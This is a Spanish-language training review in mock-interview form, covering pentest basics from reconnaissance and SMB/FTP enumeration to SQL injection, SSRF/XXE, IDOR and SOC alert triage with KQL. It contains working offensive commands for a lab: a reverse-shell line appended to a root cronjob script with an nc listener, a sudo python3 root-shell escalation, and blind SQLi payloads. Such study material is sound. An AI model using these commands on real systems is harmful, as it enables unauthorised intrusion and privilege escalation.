# Día 31 — Mes 1 Review

**Fecha:** Mayo 2026  
**Formato:** Mock Interview — Repaso Días 1-30

---

## Resumen del Mes 1

| Semana | Tema | Días |
|--------|------|------|
| 1-2 | Reconnaissance & Scanning | 1-15 |
| 3 | Vulnerability Assessment | 16-22 |
| 4 | Initial Access & Exploitation | 23-30 |

---

## Semana 1-2 — Reconnaissance & Scanning

### P1: Solo tienes la IP 192.168.1.96. ¿Cuál es el primer comando que ejecutas?

```bash
nmap -sS -sV -O 192.168.1.96
```

- `-sS` (SYN Scan) — poco ruido. Manda SYN, recibe SYN-ACK, responde RST. Nunca completa el handshake — más difícil de detectar y más rápido. Default de nmap con privilegios root.
- `-sV` — detecta versiones de **servicios** (no del SO)
- `-O` — detecta el sistema operativo

Antes del scan, confirmar que el host está activo:
```bash
nmap -sn 192.168.1.96
```

### P2: Nmap muestra el puerto 445 abierto. ¿Qué protocolo es y qué extraes?

Puerto 445 → **SMB** (Server Message Block), no FTP.

- FTP → puertos 20 y 21
- SMB → puerto 445 (139 legacy)

```bash
smbclient -L //192.168.1.96 -N          # listar shares
nmap --script smb-enum-shares,smb-enum-users 192.168.1.96
crackmapexec smb 192.168.1.96           # null session
```

Lo que se busca: shares con archivos sensibles, usuarios del sistema, versión de SMB (SMBv1 → EternalBlue MS17-010), null sessions.

### P3: Puerto 21 abierto con anonymous login. ¿Qué haces una vez dentro?

```bash
ftp 192.168.1.96
# usuario: anonymous / password: (vacío)

ftp> ls -la       # listar archivos incluyendo ocultos
ftp> pwd          # directorio actual
ftp> cd ..        # intentar subir directorios
ftp> get archivo  # descargar archivos interesantes
```

Se busca: archivos `.conf`, `.env`, `.bak`, credenciales hardcodeadas, archivos con permisos de escritura para subir webshell.

Detección automática con nmap:
```bash
nmap --script ftp-anon 192.168.1.96 -p 21
```

### P4: ¿Qué herramienta usas para descubrir directorios ocultos y qué wordlist?

- **Gobuster** — brute force de directorios (no Nikto, que es scanner de vulnerabilidades)
- **Nikto** — detecta configuraciones inseguras, headers faltantes, archivos expuestos

```bash
gobuster dir -u http://192.168.1.96 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://192.168.1.96
```

Wordlists reales:
```
/usr/share/wordlists/dirb/common.txt                        (~4,600 entradas)
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt (~220,000 entradas)
```

### P5: ¿Qué es un WAF y cómo lo detectas?

WAF (Web Application Firewall) opera en **capa 7** — analiza el contenido HTTP buscando payloads maliciosos.

```
Firewall tradicional → capas 3-4 → filtra por IP y puerto
WAF                  → capa 7    → filtra por contenido HTTP
```

Un WAF no se detecta con nmap — el puerto 80 aparece abierto igual. Se detecta con:

```bash
wafw00f http://192.168.1.96
```

Manda payloads maliciosos y analiza las respuestas. Si el servidor devuelve headers específicos o páginas de error características, identifica el vendor del WAF.

**Modelo OSI aplicado a seguridad:**

| Capa | Dispositivo | Qué ve |
|------|------------|--------|
| 2 | Switch | MACs — reenvía por puerto físico |
| 3 | Router | IPs — routing + NAT |
| 4 | Firewall | IP + Puerto — filtra tráfico |
| 7 | WAF | Contenido HTTP — bloquea payloads |

**Encapsulación hop a hop:**
La IP permanece constante en todo el camino. La MAC cambia en cada salto porque solo tiene significado dentro de un segmento de red local. En NAT, el router desencapsula hasta capa 3 para leer la IP, hace la traducción y re-encapsula con nueva MAC.

### P6: Diferencia entre SQLi normal y SQLi Blind

| | SQLi Normal | SQLi Blind |
|--|------------|-----------|
| **Output** | Datos de la DB directamente en la respuesta | Solo una respuesta booleana (true/false) |
| **Técnica** | UNION-based, error-based | Boolean-based, time-based |
| **Velocidad** | Rápida | Lenta — caracter por caracter |

**SQLi Blind Boolean-based:**
```sql
' AND 1=1--   → página normal    → TRUE
' AND 1=2--   → página diferente → FALSE
```

**SQLi Blind Time-based** (cuando no hay diferencia visual):
```sql
' AND SLEEP(5)--  → si tarda 5 segundos → vulnerable
```

sqlmap automatiza ambas técnicas mandando miles de preguntas y reconstruyendo la DB completa.

---

## Semana 3 — Vulnerability Assessment

### P7: Tienes shell como www-data. ¿Primer comando para escalar privilegios?

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `find /` — busca desde la raíz
- `-perm -4000` — bit SUID activo
- `-type f` — solo archivos
- `2>/dev/null` — descarta errores de permission denied

La `s` en los permisos indica SUID activo:
```
-rwsr-xr-x root root /usr/bin/find
    ↑
    s = se ejecuta con permisos del dueño (root)
```

### P8: Diferencia entre SUID, Sudo y Cron como vectores de escalación

| Vector | Mecanismo | Cómo buscar |
|--------|----------|------------|
| SUID | Binario ejecuta con permisos del dueño | `find / -perm -4000` |
| Sudo | Comando permitido sin password | `sudo -l` |
| Cron | Script de root con permisos de escritura | `cat /etc/crontab` |

**Sudo** es el más fácil de explotar — `sudo -l` dice exactamente qué puedes hacer:
```bash
sudo -l
# → (ALL) NOPASSWD: /usr/bin/python3

sudo python3 -c "import os; os.system('/bin/bash')"
# → root shell
```

**Cron** ejecuta con los permisos del usuario que creó el cronjob — no siempre root. Los cronjobs en `/etc/crontab` y `/etc/cron.d/` sí los ejecuta root.

### P9: Cronjob ejecuta /opt/backup.sh cada minuto como root con permisos 777. ¿Qué haces?

```bash
# Agregar reverse shell al script (>> para no borrar contenido original)
echo "bash -i >& /dev/tcp/192.168.1.132/4444 0>&1" >> /opt/backup.sh

# Levantar listener en Kali ANTES de esperar el minuto
nc -lvnp 4444

# Esperar hasta 1 minuto → cron ejecuta backup.sh como root
# → shell de root en Kali
```

`>>` en lugar de `>` — el backup original sigue funcionando, más difícil de detectar.

No ejecutar `./backup.sh` manualmente — eso lo ejecutaría como www-data, no como root. La escalación viene de que **cron lo ejecute como root**.

---

## Semana 4 — Initial Access & Exploitation

### P10: Diferencia entre SSRF y XXE (ambos T1190)

| | SSRF | XXE |
|--|------|-----|
| **Vector** | Parámetro que acepta URLs | Endpoint que parsea XML |
| **Mecanismo** | Servidor hace requests HTTP internos | Parser lee archivos del sistema |
| **Qué obtienes** | Acceso a servicios internos | Contenido de archivos del servidor |
| **Lab** | Foto de perfil en Juice Shop | Upload de SVG en Juice Shop |

XXE puede usarse para hacer SSRF apuntando la entidad a una URL interna — por eso comparten T1190. Son técnicas distintas que pueden combinarse.

### P11: Diferencia entre IDOR y Broken Authentication

**IDOR** → problema de **autorización**
- Estás autenticado correctamente
- Cambias un parámetro (ID en URL o body) para acceder a recursos de otros usuarios
- El servidor no verifica si tienes permiso sobre ese recurso específico

**Broken Authentication** → problema de **autenticación**
- No estás autenticado correctamente
- Vectores: brute force, credential stuffing, session fixation, weak tokens

```
IDOR              → autenticado, accedes a recursos ajenos
Broken Auth       → no autenticado correctamente
```

### P12: Alerta "Unusual number of failed sign-in attempts". ¿Qué revisas primero?

**1. IP de origen**
¿Interna o externa? ¿En listas de threat intel? ¿País de origen?
```
IP interna  → cuenta comprometida dentro de la red
IP externa  → brute force o credential stuffing desde internet
```

**2. Patrón de tiempo**
¿Intentos por minuto? ¿Secuenciales o distribuidos?
```
100 intentos en 10 segundos → herramienta automatizada
5 intentos en 1 hora        → atacante manual
```

**3. Cuenta / dispositivo objetivo**
¿Es una cuenta privilegiada? ¿Dispositivo crítico?
```
Intentos contra "admin"  → alta prioridad, account lockout inmediato
Intentos contra usuario normal → prioridad media, notificar al usuario
```

**Query KQL para investigar:**
```kql
AlertInfo
| where Title contains "failed sign-in"
| join kind=inner AlertEvidence on AlertId
| project Timestamp, AccountName, DeviceName, AttackTechniques
| sort by Timestamp asc
```

---

## Conclusión

El Mes 1 cubrió el ciclo completo de un pentest básico: reconnaissance, scanning, enumeration, vulnerability assessment e initial access. Los conceptos más importantes para un rol SOC Analyst son la distinción entre autenticación y autorización (IDOR vs Broken Auth), el modelo OSI aplicado a herramientas de seguridad (WAF en capa 7 vs firewall en capas 3-4), y el proceso de triage de alertas (IP → patrón de tiempo → cuenta objetivo). Los 13 operadores KQL acumulados en los Días 27-30 forman la base del threat hunting con Defender XDR.
